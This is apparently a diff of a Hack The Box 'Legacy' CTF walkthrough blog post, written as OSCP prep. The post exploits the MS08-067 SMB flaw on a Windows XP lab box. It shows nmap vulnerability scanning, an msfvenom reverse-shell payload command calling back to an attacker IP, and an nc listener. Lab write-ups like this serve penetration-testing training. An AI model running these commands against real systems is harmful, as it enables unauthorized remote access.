@@ -1,26 +1,25 @@
 ---
-title: 'HTB: Legacy'
+title: HTB Legacy
 date: 2021-08-03 21:51:00 -0600
 categories: [HTB, Windows]
 tags: [oscp-like, legacy, windows, smb, ms08-067, msfvenom, ctf, hackthebox, htb, reconnoitre, 2to3]
 ---
-
-# Intro
+## Intro
 
 So I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don't have any reason not to.  Community consensus seems to be that TJNull's list of ["OSCP-like"](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#vulnerable-machines) boxes is excellent prep. So I figured I'd start with that. Its broken down by Linux and Windows. I always feel more comforatble on Linux than I do Windows, so I'm going to start doing all the Windows ones first.
 
 
-# Initial Engagement & Enumeration
+## Initial Engagement & Enumeration
 
 Started with a general reconnassaince and services scan via [reconnoitre](https://github.com/codingo/Reconnoitre). I'd actually stumbled on this tool a while back when I was looking for enumeration and initial engagement automation frameworks. I've used it a lot since then, and I'm thrilled its in play for OSCP. [Codingo](https://twitter.com/codingo_) did an excellent job with it.
 
-## Reconnoitre
+### Reconnoitre
 
 ```bash
 reconnoitre -t 10.129.192.174 -o . --services
 ```
 
-## Scan Results
+### Scan Results
 
 ![Scan Results](/assets/img/htb/legacy/legacy_scan_results.png)
 
@@ -29,11 +28,11 @@ Initial scan reveals the box to be:
 - Windows XP (2000 Lan Manager)
 - Likely on SMBv2
 
-# Enumeration
+## Enumeration
 
 Port 445 is open. Given the OS version and likely patch level of the OS, and lack of other open services, SMB is likely fertile ground for an exploitation vector to gain a foothold on this box. Let's execute some vulnerability scanning functionality within nmap to see if we can find a viable pathway.
 
-## Using NMAP to check for SMB Vulnerabilities
+### Using NMAP to check for SMB Vulnerabilities
 ```bash
 # I recoommend running this with root privileges, so if you aren't root, sudo
 nmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.129.192.174
@@ -81,7 +80,7 @@ I generally believe in following the path of least resistance whenever possible,
 
 Reading through the POC, we will need to generate our own unique reverse shell payload. I prefer reverse shells whenever possible, as target firewalls are generally more permissive outbound, than inbound (less logging generally, too).
 
-## Generating Shellcode
+### Generating Shellcode
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.142 LPORT=4443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -a x86 --platform windows
 ```
@@ -95,10 +94,10 @@ Thankfully the POC is well documentated for what it wants for shellcode, but to 
 
 ![Shellcode Generation](/assets/img/htb/legacy/legacy_shellcode_gen.png)
 
-## Some SC Generation Quirks
+### Some SC Generation Quirks
 I did screw up and forget to pass the ```-v``` flag, allowing me to rename the buf variable to shellcode. So I reran ```msfvenom``` but I didn't take a new screenshot. 
 
-## Converting from Python2 to Python3
+### Converting from Python2 to Python3
 After inserting the new shellcode, I *really* didn't feel like dealing with python2 dependencies, so I converted the python2 syntax of the POC to python3 with [2to3](https://docs.python.org/3/library/2to3.html).
 
 ```bash
@@ -106,10 +105,10 @@ After inserting the new shellcode, I *really* didn't feel like dealing with pyth
 └─$ 2to3 -w MS08-067.py
 ```
 
-## Finalizing the Code
+### Finalizing the Code
 With the code patched the have relevant shellcode, and migrated from python2 to python3, it's ready to execute. If you are looking for my finalized exploit code for MS08-67, it is hosted on my github [here](https://github.com/nullprism/htb-boxes/tree/main/legacy).
 
-## Executing the Exploit
+### Executing the Exploit
 
 Executing the script yields some help and targeting context:
 ```
@@ -153,25 +152,25 @@ Host script results:
 |_  System time: 2021-08-09T07:12:11+03:00
 ```
 
-## Selecting a Target Framework
+### Selecting a Target Framework
 
 It was. So my target options here are 1, 5, 6, 7. I feel safe in ruling out the French language pack (#5), and the AlwaysOn option (#7). I typically shy away from Universal options, so let's try 6 first, and if that fails, we can try 1. 
 
-## Setting Up a Listener
+### Setting Up a Listener
 First, let's set up our catcher:
 
 ```bash
 nc -lnvp 4443
 ```
 
-## Shell
+### Shell
 After a VPN output mid-exploit, forcing me to reconnect and reset the box, success.
 
 ![Shell Callback](/assets/img/htb/legacy/legacy_shell_callback.png)
 
-# Post-Exploitation
+## Post-Exploitation
 
-## Entry
+### Entry
 ```cmd
 C:\WINDOWS\system32>whoami
 whoami
@@ -198,13 +197,13 @@ Ethernet adapter Local Area Connection 2:
 C:\WINDOWS\system32>
 ```
 
-## Legacy OS Quirks
+### Legacy OS Quirks
 You can be like me and forget you are on Windows XP, it is old after all, and type ```whoami```. It doesn't exist on XP. I was able to enumerate the host name, but not the username with system variables in the cmd shell. After some research, I discovered you could pull ```whoami.exe``` onto the box if you really needed to know which user you are, but its well-documented that this exploit lands you as **NT AUTHORITY\SYSTEM**. 
 
-## Privilege Escalation
+### Privilege Escalation
 Long story, short; we don't need to bother with privilege escalation. We can go straight for the flags.
 
-## Flags
+### Flags
 ![User Flag](/assets/img/htb/legacy/legacy_user_flag.png)
 
 ![Root Flag](/assets/img/htb/legacy/legacy_root_flag.png)
